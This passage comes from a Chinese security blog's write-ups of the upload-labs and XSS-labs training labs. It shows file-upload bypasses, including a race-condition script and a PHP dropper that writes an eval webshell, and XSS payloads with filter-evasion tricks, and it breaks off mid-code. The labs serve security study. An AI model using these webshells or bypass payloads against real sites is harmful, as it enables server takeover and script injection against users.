class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p><p>也就是说上传的非法文件会被删除,但又没有文件包含漏洞所以图片马又不好使,所以我们可以分析一下</p><p>代码运行分析到我们文件是非法的并且删除的过程是有时间的,那么我们就可以在文件还没有被删除的某一瞬间访问到,但是这个过程通过人工是不可能的</p><p>那么我们可以对服务器一直发送非法文件并且同时不停的访问这个文件,而这也称为条件竞争,顾名思义就是和删除文件的函数竞争这个非法文件</p><p>而这个过程可以通过bp的intruder模块多线程发包,同时用bp不停访问或者写python脚本实现这个功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意:在这个过程中,即使访问到我们上传的php文件也无法用蚁剑连接到,毕竟访问到后文件依旧被删除,所以我们考虑写一个这样的php文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;ytm666&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而这段代码的大致意思就是访问到后能在目录下写入一个这样的一句话木马,之后我们连接写入后的文件shell.php就好了</p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>依旧先分析下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>发现与上题大体类似,但本题从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。文件上传之后又对其进行了重命名。</p><p>那么我们可以利用apache解析漏洞,将.php后缀后面再加上一个.7z后缀,这样后台把.7z当作后缀不会删除,但是apache服务器解析不了.7z文件就会继续向前解析.php文件</p><p>所以我们需要做的是在文件名被改之前,访问到这个文件,那么做法和上题大体相同</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>利用之前的几种后缀绕过方法都能绕过</p><h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><p>先进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这一关白名单</span><br><span class="line">验证过程：</span><br><span class="line">--&gt; 验证上传路径是否存在</span><br><span class="line">--&gt; 验证[&#x27;upload_file&#x27;]的content-type是否合法（可以抓包修改）</span><br><span class="line">--&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</span><br><span class="line">--&gt;判断file不是数组则使用explode(&#x27;.&#x27;, strtolower($file))对file进行切割，将file变为一个数组</span><br><span class="line">--&gt; 判断数组最后一个元素是否合法</span><br><span class="line">--&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</span><br><span class="line">--&gt; 上传文件</span><br></pre></td></tr></table></figure><p>这道题重点就是让分割后的最后一个数组符合要求,并且让首个数组和$file[count($file) - 1]部分拼接</p><p>那么我们的思路就是传多个数组,让数组末尾符合要求,并且首位拼接后符合php后缀</p><p>这样我们可以传一个下表大于一的数组作为最后一位数组,例如$file[5]&#x3D;jpg绕过白名单</p><p>并且前两位数组可以传为$file[0]&#x3D;shell.php,$file[1]&#x3D;php</p><p>这样我们只传了三个有效数组,$file[count($file) - 1]这部分结果就为$file[2]</p><p>但是因为我们file[2]实际上是没有值的,这样和第一位数组拼接就成为了shell.php.</p><p>这样就成功的绕过并上传后门了</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-labs</title>
      <link href="/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/"/>
      <url>/2023/10/19/%E9%9D%B6%E5%9C%BA-2023-10-19-XSS-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><p>我用的是线上XSS-labs:<br><a href="https://xssaq.com/yx/">https://xssaq.com/yx/</a></p><p>一些知识点详见周记2的XSS部分:<br><a href="https://hades-blog.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/">https://Hades-blog.github.io/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</a></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>查看网站源码，可以发现get传参name的值test插入了html里头，还回显了payload的长度</p><p>直接get传js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>第一个test可以跟上次一样直接插入js即可，我们先试试看</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>没成功，看一下源码</p><p><img src="https://img-blog.csdnimg.cn/bf7314876c0543c1ad3e7e7da77fb55e.png" alt="1"></p><p>第一个test进行了html实体转义，但是第二个没有，我们只需要闭合掉前面的input和引号即可，构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  &lt;&quot;</span><br></pre></td></tr></table></figure><p>或者末尾通过注释使其失效也可以</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>经过尝试发现符号都被实体化了,并看源码发现用的是htmlspecialchars() 函数</p><p>那我们先讲讲htmlspecialchars()函数</p><p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素</p><p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p><hr><p>那么我们可以通过单引号闭合前面的双引号但无法用尖括号闭合input标签</p><p>这样的话我们可以考虑html事件通过某种触发输入框时执行代码</p><p>比如我们可以选择比较常用的一种事件,payload如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;onclick=&#x27;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不难发现,payload注入在其中后,第一个单引号把value后面的双引号闭合.第二个单引号与最后的双引号将js代码包裹其中</p><p>这样注入之后通过点击输入框来执行js代码</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>与上题同理,只不过多了些过滤,直接上payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试本题的双引号和尖括号等没有被实体化,但是过滤了on这类常用的事件,那么基本上就要考虑其他方法来执行js代码了</p><p>我们可以选择使用超链接,利用js伪协议执行js代码(周记2有写到)</p><p>那么我们只需要闭合input标签和无关紧要的双引号(超链接之后的没必要闭合因为不印象超链接的生成)就可以成功注入这段超链接了,payload如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>经过尝试,虽然符号没被实体化,但多过滤了href,src等关键词</p><p>通过查阅资料,尝试了一下大写的herf,结果成功了,下面给出payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hRef=&quot;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>经过尝试上一关的语句,发现href和script部分被检测到后被删掉了,那我们可以尝试双写绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hrhrefef=&quot;</span><span class="attr">javascrscriptipt</span>:<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)<span class="string">&quot;&gt;link&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>经过尝试发现输入的部分会被引用在友情链接的href部分,但过滤很严格,基本之前的绕过方法都不管用了</p><p>那么我们可以尝试使用html实体编码把js伪协议部分编码的值输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span></span><br></pre></td></tr></table></figure><p>这样前端接收到我们的内容会自动解码成代码并执行,并且成功绕过检测</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>和上题大致但过滤更为严格,html编码无法使用,那么我们查看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span 